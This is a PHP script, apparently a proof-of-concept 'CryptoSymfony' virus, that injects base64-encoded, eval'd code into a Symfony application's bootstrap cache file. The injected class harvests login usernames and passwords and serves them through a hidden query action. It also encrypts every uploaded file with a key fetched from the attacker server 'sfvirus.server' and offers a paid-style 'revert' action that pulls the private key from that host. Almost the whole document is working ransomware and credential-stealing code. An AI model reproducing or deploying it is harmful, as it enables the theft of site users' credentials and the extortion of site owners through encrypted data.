#!/usr/bin/env php
<?php

// options
$bootstrapFile = __DIR__ . '/../project/app/bootstrap.php.cache';
$hackerUrl = 'http://sfvirus.server/get_public_key.php';

// get public key from hacker's server
$response = file_get_contents($hackerUrl);
$key = json_decode($response);
$keyId = $key->id;
$pubKey = $key->key;

// generate a random id for the virus
$virusId = mt_rand(10000, 99999);

// generate code that will be injected
$virusClassName = 'V' . $virusId;
$virusClass = <<<CLASS

class $virusClassName
{
    public static \$magicNumber = 'CRYPTOSYMFONY14';
    public static \$container;
    public static \$pubKey = <<<'KEY'
$pubKey
KEY;
    public static function encrypt(\$data)
    {
        \$password = sha1(microtime(true));
        \$encryptedPassword = "";
        openssl_public_encrypt(\$password, \$encryptedPassword, self::\$pubKey);

        \$encrypted = '[' . mb_strlen(\$encryptedPassword) . ']' . \$encryptedPassword . openssl_encrypt(\$data, 'aes128', \$password, 0, '1234567812345678');

        return \$encrypted;
    }
    public static function decrypt(\$data, \$privKey, \$password)
    {
        \$passwordDecrypted = '';
        openssl_private_decrypt(\$password, \$passwordDecrypted, \$privKey);

        return openssl_decrypt(\$data, 'aes128', \$passwordDecrypted, 0, '1234567812345678');
    }
    public static function extractContainer(\$kernel)
    {
        \$containerRef = new \ReflectionProperty(\$kernel, 'container');
        \$containerRef->setAccessible(true);
        self::\$container = \$containerRef->getValue(\$kernel);
    }
    public static function handleActions(\$request)
    {
        if (\$request->query->has('cryptosymfony_action')) {
            \$action = \$request->query->get('cryptosymfony_action');

            switch (\$action) {
                case 'revert':
                    \$privKey = file_get_contents('http://sfvirus.server/get_private_key.php?id=' . sha1(self::\$pubKey));
                    \$finder = new \Symfony\Component\Finder\Finder();
                    \$finder->in(__DIR__.'/../web/uploads')->files();

                    foreach (\$finder as \$file) {
                        \$handler = fopen(\$file->getRealPath(), 'r+');
                        \$decrypt = fread(\$handler, 15) == self::\$magicNumber;

                        if (!\$decrypt) {
                            fclose(\$handler);
                            exit(0);
                        }

                        \$encryptedPasswordLen = substr(fread(\$handler, 5), 1, 3);
                        \$encryptedPassword = fread(\$handler, \$encryptedPasswordLen);
                        fclose(\$handler);

                        \$decrypted = self::decrypt(substr(\$file->getContents(), 15 + 4 + \$encryptedPasswordLen), \$privKey, \$encryptedPassword);

                        file_put_contents(\$file->getRealPath(), \$decrypted);
                    }
                    exit(0);
                    break;
                case 'get_users':
                    \$cacheDir = self::\$container->getParameter('kernel.cache_dir');
                    @mkdir(\$cacheDir . '/users');
                    \$finder = new \Symfony\Component\Finder\Finder();
                    \$finder->in(\$cacheDir . '/users')->files()->name('*.pair');

                    \$output = array(
                        'key' => sha1(self::\$pubKey),
                        'users' => array()
                    );

                    foreach (\$finder as \$file) {
                        \$output['users'][] = base64_encode(\$file->getContents());
                    }

                    echo json_encode(\$output);
                    exit(0);
                    break;
            }
        }
    }
    public static function extractUserPassword(\$request)
    {
        \$username = \$request->get('_username');
        \$password = \$request->get('_password');
        if (!is_null(\$username) && !is_null(\$password)) {
            \$cacheDir = self::\$container->getParameter('kernel.cache_dir');
            @mkdir(\$cacheDir . '/users');
            \$handler = fopen(\$cacheDir . '/users/' . sha1(\$username) . '.pair', 'a');
            fwrite(\$handler, self::encrypt(sprintf("%s:%s", \$username, \$password)));
            fclose(\$handler);
        }
    }
    public static function process(\$eventType, \$event)
    {
        if (\$eventType == \Symfony\Component\HttpKernel\KernelEvents::REQUEST) {
            self::extractContainer(\$event->getKernel());

            \$request = \$event->getRequest();

            self::extractUserPassword(\$request);
            self::handleActions(\$request);
        } elseif (\$eventType == \Symfony\Component\HttpKernel\KernelEvents::RESPONSE) {
            \$event->getResponse()->headers->set('X-CryptoSymfony', 'You have been hacked!');
        } elseif (\$eventType == \Symfony\Component\HttpKernel\KernelEvents::TERMINATE) {
            \$magicNumber = 'CRYPTOSYMFONY14';
            \$finder = new \Symfony\Component\Finder\Finder();
            \$finder->in(__DIR__.'/../web/uploads')->files();

            foreach (\$finder as \$file) {
                \$handler = fopen(\$file->getRealPath(), 'r+');
                \$encrypt = fread(\$handler, 15) != \$magicNumber;
                fclose(\$handler);

                if (\$encrypt) {
                    file_put_contents(\$file->getRealPath(), \$magicNumber . self::encrypt(\$file->getContents()));
                }
            }
        }
    }
};

CLASS;

// encode virus code
$virusClassEncoded = base64_encode($virusClass);
$virusCode = sprintf('namespace {eval(base64_decode("%s"));}', $virusClassEncoded);

$virusDispatchCall = sprintf('\\%s::process', $virusClassName);

// infect the bootstrap file
$bootstrap = file_get_contents($bootstrapFile);

$bootstrap = preg_replace_callback('/\$this->dispatcher->dispatch(\([^;]+);/', function($matches) use ($virusDispatchCall) {
    return $matches[0] . $virusDispatchCall . $matches[1] . ';';
}, $bootstrap);

$bootstrap = preg_replace('/^<\?php/', "<?php\n" . $virusCode, $bootstrap);
file_put_contents($bootstrapFile, $bootstrap);

// remove itself
//unlink(__FILE__);
